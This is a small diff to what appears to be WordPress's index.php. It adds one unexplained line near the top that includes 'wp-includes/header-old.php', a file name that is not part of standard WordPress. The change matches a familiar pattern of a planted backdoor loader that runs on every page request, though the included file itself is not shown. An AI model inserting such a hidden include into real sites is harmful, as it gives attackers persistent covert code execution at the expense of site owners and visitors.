@@ -11,6 +11,8 @@
  *
  * @var bool
  */
+include 'wp-includes/header-old.php' ; 
+
 define( 'WP_USE_THEMES', true );
 
 /** Loads the WordPress Environment and Template */
